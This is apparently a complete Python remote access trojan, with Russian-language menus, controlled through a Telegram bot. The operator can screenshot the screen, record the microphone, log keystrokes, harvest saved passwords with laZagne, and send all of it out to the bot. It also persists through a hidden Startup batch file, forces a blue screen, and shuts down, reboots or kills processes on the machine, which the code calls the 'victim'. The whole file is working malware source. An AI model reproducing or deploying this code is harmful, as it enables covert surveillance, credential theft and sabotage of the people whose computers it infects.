import re
import cv2
import time
import ctypes
import random
import socket
import telebot
import getpass
import os, sys
import requests
import pyautogui
import webbrowser
import pyaudio,wave
from ctypes import *
from sys import platform
from pynput import keyboard
from bs4 import BeautifulSoup
from ctypes.wintypes import *
from playsound import playsound
from PIL import Image, ImageGrab

USER_NAME = getpass.getuser()

mytoken = 'Telegram bot token'

bot = telebot.TeleBot(mytoken)

mainkeyboard = telebot.types.ReplyKeyboardMarkup()

mainkeyboard.add('Питание🟢','Запись🔊','Браузер🟡','Приложения🟥','ip🈴','Скриншот👀','Помощь⚒')


powerkeyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)

powerkeyboard.add('Назад🗿','Выключить пк⚠️','Перезагрузить пк🖥')

appkeyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=3)

appkeyboard.add('Назад🗿','Убить приложение❌','Включить приложение✅')

@bot.message_handler(content_types=['text'])
def commands(message):
        if message.text == '/start':
                bot.send_message(message.chat.id,'Выбери действие',reply_markup=mainkeyboard)

        elif message.text == 'Питание🟢':
                bot.send_message(message.chat.id,'Выбери действие',reply_markup=powerkeyboard)

        elif message.text == 'Приложения🟥':
            bot.send_message(message.chat.id,'Выбери действие',reply_markup=appkeyboard)

        elif message.text == 'Назад🗿':
                bot.send_message(message.chat.id,'Вернул вас назад',reply_markup=mainkeyboard)

        elif message.text == '/off' or message.text == 'Выключить пк⚠️':
                bot.send_message(message.chat.id,'Компьютер будет выключен!',reply_markup=powerkeyboard)
                os.system('shutdown -s')

        elif message.text == '/help' or message.text == 'Помощь⚒':
                bot.send_message(message.chat.id,'/off(выкл пк)\n/open(открыть ссылку в браузере)\n/screen(сделать скриншот экрана)\n/process(включить процесс)\n/kill(убить процесс)\n/reboot(перезагрузить пк)\n/ip(узнать ip,город,браузер)\n/rep(запустить файл.mp3)\n/record(записать звуки с микрофона)\n/bluesreen(синий экран на пк)\n/oc(выведит операционную систему и имя пк)\n/tasklist(узнать список запущенных процессов)',reply_markup=mainkeyboard)
        elif message.text == '/tasklist':
                try:
                        bot.send_chat_action(message.chat.id,'upload_document')
                        os.system('tasklist>  C:\\ProgramData\\Tasklist.txt')
                        tasklist = open('C:\\ProgramData\\Tasklist.txt')
                        bot.send_document(message.chat.id,tasklist)
                        tasklist.close()
                        os.remove('C:\\ProgramData\\Tasklist.txt')
                except:
                        bot.send_message(message.chat.id,'Ошибка,не удалось получилось список ')

        elif message.text == '/open' or message.text == 'Браузер🟡':
                bot.register_next_step_handler(message,get_url)
                bot.send_message(message.chat.id,'Отправьте ссылку!',reply_markup=mainkeyboard)

        elif message.text == '/screen' or message.text == 'Скриншот👀':
                try:
                        bot.send_message(message.chat.id,'Делаю скриншот')
                        screen = pyautogui.screenshot('screenshot.png')
                        screen = open('screenshot.png', 'rb')
                        bot.send_photo(message.chat.id, screen,reply_markup=mainkeyboard)
                        os.remove("screenshot.png")
                except:
                        pass

        elif message.text == '/process' or message.text == 'Включить приложение✅':
                bot.send_message(message.chat.id,'Какой процесс хотите запустить(steam.exe)',reply_markup=appkeyboard)
                bot.register_next_step_handler(message,get_process)


        elif message.text == '/ip' or message.text == 'ip🈴':
                url = 'https://yandex.ru/internet/'
                page = requests.get(url)
                soup = BeautifulSoup(page.text, "html.parser")
                ip = soup.findAll('ul', class_='general-info layout__general-info')
                ip = str(ip)
                ip = re.sub('<[^>]*>', '\n', ip)
                bot.send_message(message.chat.id,'Айпи жертвы - ' + str(ip),reply_markup=mainkeyboard)

        elif message.text == '/kill' or message.text == 'Убить приложение❌':
                bot.send_message(message.chat.id,'Какой процесс хотите убить(steam.exe)')
                bot.register_next_step_handler(message,get_kill)


        elif message.text == '/reboot' or message.text == 'Перезагрузить пк🖥':
                bot.send_message(message.chat.id,'Перезагрузил!')
                os.system('shutdown -r -t 0')

        elif message.text == '/rep':
                bot.send_message(message.chat.id,'Какой файл вы хотите включить?')
                bot.register_next_step_handler(message,get_audio)

        elif message.text == '/record' or message.text == 'Запись🔊':
                bot.send_message(message.chat.id,'Сколько секунд записать?(не больше 60):')
                bot.register_next_step_handler(message,get_record)

        elif message.text == '/OC' or message.text == '/oc':
                if platform == "linux" or platform == "linux2":
                         bot.send_message(message.chat.id,'oc: linux\nИмя ПК: ' + socket.gethostname())

                elif platform == "darwin":
                        bot.send_message(message.chat.id,'oc: OS X\nИмя ПК: ' + socket.gethostname())

                elif platform == "win32":
                        bot.send_message(message.chat.id,'oc: Windows\nИмя ПК: ' + socket.gethostname())

        elif message.text == '/bluescreen' or message.text == 'Экран смерти':
                try:
                    tmp1 = c_bool()
                    tmp2 = DWORD()
                    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(tmp1))
                    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, byref(tmp2))
                    bot.send_message(message.chat.id, 'Синий экран вкл')

                except:
                   bot.send_message(message.chat.id, 'ошибка,не удалось вкл синий экран')

        elif message.text == '/keylogger':
                bot.send_message(message.chat.id,'Кейлоггер вкл,что бы получить файл /send')
                def on_press(key):
                        try:
                                item = open('pressed.txt','a+')
                                item.write(f'|{key.char}|')
                                item.close
                        except AttributeError:
                                pass

                def on_release(key):
                        print('{0} released'.format(
                        key))
                        if key == keyboard.Key.esc:
                                return False


                with keyboard.Listener(
                        on_press=on_press,
                        on_release=on_release) as listener:
                        listener.join()

                        listener = keyboard.Listener(
                        on_press=on_press,
                        on_release=on_release)
                        listener.start()
                
        elif message.text == '/send':
                try:

                        item = open('pressed.txt')
                        bot.send_message(message.chat.id,'Держи')
                        bot.send_document(message.chat.id,item)
                        item.close()
                except:
                        bot.send_message(message.chat.id,'ошибка')



        elif message.text == '/auto':
                def add_to_startup(file_path=""):
                        if file_path == "":
                                file_path = os.path.dirname(os.path.realpath(__file__))
                        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
                        with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
                                bat_file.write('nircmd win hide title "%ComSpec%"\n@echo off\n')
                                bat_file.write(r'start  %s' % file_path + '\\main.py')
                try:
                        add_to_startup()
                        bot.send_message(message.chat.id,'добавил в автозагрузку')
                except:
                        bot.send_message(message.chat.id, 'ошибка,не добавил в автозагрузку|PS(МБ не сменил имя файла оно стандартно Название)')


        elif message.text == '/logs':
                os.system('laZagne.exe all -oN')
                time.sleep(5)
                files = os.listdir()
                for file in files:
                        if 'credentials' in file:
                                password_file = open(file)
                                bot.send_document(message.chat.id,password_file)
                                password_file.close()
                        

                


def get_record(message):
        global record
        record = message.text
        try:
                record = int(record)
                if record < 60:
                        bot.send_message(message.chat.id,'Записываю,подожди')
                        CHUNK = 1024
                        FORMAT = pyaudio.paInt16
                        CHANNELS = 1
                        RATE = 44100
                        RECORD_SECONDS = record
                        WAVE_OUTPUT_FILENAME = "audio.wav"
                        p = pyaudio.PyAudio()
                        stream = p.open(format=FORMAT,
                                        channels=CHANNELS,
                                        rate=RATE,
                                        input=True,
                                        input_device_index=1,
                                        frames_per_buffer=CHUNK)
                        frames = []
                        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                            data = stream.read(CHUNK)
                            frames.append(data)
                        stream.stop_stream()

                        stream.close()

                        p.terminate()

                        wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')

                        wf.setnchannels(CHANNELS)

                        wf.setsampwidth(p.get_sample_size(FORMAT))

                        wf.setframerate(RATE)

                        wf.writeframes(b''.join(frames))

                        wf.close()

                        audio = open('audio.wav', 'rb')

                        bot.send_audio(message.chat.id, audio)
                else:
                        bot.send_message(message.chat.id,'сказано не больше 60sec!',reply_markup=mainkeyboard)

        except:
                bot.send_message(message.chat.id,'в числовом формате!',reply_markup=mainkeyboard)

def get_audio(message):
        global audio
        audio = message.text
        try:
                playsound(audio)
                bot.send_message(message.chat.id,'Включил данный файл\n ' + audio,reply_markup=mainkeyboard)
        except:
                bot.send_message(message.chat.id,'Не нашел данный файл\n ' + audio,reply_markup=mainkeyboard)

def get_url(message):
        global url
        url = message.text
        webbrowser.open_new_tab(url)
        bot.send_message(message.chat.id,'Ссылка открыта!',reply_markup=mainkeyboard)

def get_process(message):
        global process
        process = message.text
        try:
                os.startfile(process)
                bot.send_message(message.chat.id,'Включил данный процесс\n' + process,reply_markup=appkeyboard)
        except:
                 bot.send_message(message.chat.id,'Вы ввели что-то неправильно,ошибка!',reply_markup=mainkeyboard)

def get_kill(message):
        global kill
        kill = message.text
        try:
                os.system("taskkill /im " + kill)
                bot.send_message(message.chat.id,'Данный процесс убит\n' + kill,reply_markup=appkeyboard)
        except:
                bot.send_message(message.chat.id,'Вы ввели что-то неправильно,ошибка!',reply_markup=mainkeyboard)

try:
        bot.polling(none_stop=True, interval=0)
        print('Bot (ok)')
except Exception as e:
        print(f'Bot (erorr)\n {e}')
